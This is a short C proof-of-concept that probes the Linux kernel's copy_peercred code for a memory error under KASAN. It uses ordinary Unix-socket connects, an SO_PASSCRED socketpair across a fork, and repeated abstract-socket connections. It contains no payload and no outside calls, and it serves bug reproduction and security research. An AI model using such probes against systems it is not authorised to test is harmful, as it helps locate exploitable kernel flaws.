/*
 * PoC: Try to trigger KASAN in copy_peercred via various edge cases
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <errno.h>
#include <signal.h>
#include <stddef.h>

#define SOCK_PATH "/tmp/poc_unix_sock"

int make_server(void)
{
    int fd;
    struct sockaddr_un addr;
    int ret;
    
    fd = socket(AF_UNIX, SOCK_STREAM, 0);
    if (fd < 0) return -1;
    
    memset(&addr, 0, sizeof(addr));
    addr.sun_family = AF_UNIX;
    strncpy(addr.sun_path, SOCK_PATH, sizeof(addr.sun_path) - 1);
    
    unlink(SOCK_PATH);
    ret = bind(fd, (struct sockaddr *)&addr, sizeof(addr));
    if (ret < 0) { close(fd); return -1; }
    
    ret = listen(fd, 8);
    if (ret < 0) { close(fd); return -1; }
    
    return fd;
}

int main(void)
{
    int ret, server_fd, client_fd, accepted_fd;
    struct sockaddr_un addr;
    pid_t pid;
    int status;
    
    printf("[*] Test 1: Basic connect (already works)\n");
    server_fd = make_server();
    if (server_fd < 0) { perror("make_server"); return 1; }
    
    client_fd = socket(AF_UNIX, SOCK_STREAM, 0);
    memset(&addr, 0, sizeof(addr));
    addr.sun_family = AF_UNIX;
    strncpy(addr.sun_path, SOCK_PATH, sizeof(addr.sun_path) - 1);
    ret = connect(client_fd, (struct sockaddr *)&addr, sizeof(addr));
    if (ret < 0) { perror("connect"); return 1; }
    
    accepted_fd = accept(server_fd, NULL, NULL);
    if (accepted_fd < 0) { perror("accept"); return 1; }
    
    printf("[+] Basic connect works\n");
    close(accepted_fd);
    close(client_fd);
    close(server_fd);
    unlink(SOCK_PATH);
    
    /* Test 2: Fork model */
    printf("[*] Test 2: Fork and cross-connect\n");
    
    int sv[2];
    ret = socketpair(AF_UNIX, SOCK_STREAM, 0, sv);
    if (ret < 0) { perror("socketpair"); return 1; }
    
    pid = fork();
    if (pid == 0) {
        close(sv[0]);
        
        int optval = 1;
        ret = setsockopt(sv[1], SOL_SOCKET, SO_PASSCRED, &optval, sizeof(optval));
        printf("[child] setsockopt SO_PASSCRED: %d\n", ret);
        
        close(sv[1]);
        exit(0);
    }
    
    close(sv[1]);
    waitpid(pid, &status, 0);
    printf("[+] Child done\n");
    close(sv[0]);
    
    /* Test 3: Abstract socket, connect multiple times */
    printf("[*] Test 3: Abstract socket stress\n");
    
    server_fd = socket(AF_UNIX, SOCK_STREAM, 0);
    memset(&addr, 0, sizeof(addr));
    addr.sun_family = AF_UNIX;
    addr.sun_path[0] = '\0'; /* abstract */
    memcpy(addr.sun_path + 1, "poc_abstract_test", 18);
    
    ret = bind(server_fd, (struct sockaddr *)&addr, 
               sizeof(sa_family_t) + 1 + 18);
    if (ret < 0) { perror("abstract bind"); return 1; }
    
    ret = listen(server_fd, 8);
    if (ret < 0) { perror("abstract listen"); return 1; }
    
    int i;
    for (i = 0; i < 10; i++) {
        client_fd = socket(AF_UNIX, SOCK_STREAM, 0);
        ret = connect(client_fd, (struct sockaddr *)&addr,
                      sizeof(sa_family_t) + 1 + 18);
        if (ret < 0) { perror("abstract connect"); continue; }
        
        accepted_fd = accept(server_fd, NULL, NULL);
        if (accepted_fd < 0) { perror("abstract accept"); continue; }
        
        char buf[] = "hello";
        ret = write(client_fd, buf, sizeof(buf));
        (void)ret;
        char rbuf[64];
        ret = read(accepted_fd, rbuf, sizeof(rbuf));
        (void)ret;
        
        close(accepted_fd);
        close(client_fd);
    }
    
    close(server_fd);
    
    printf("[*] Done\n");
    return 0;
}
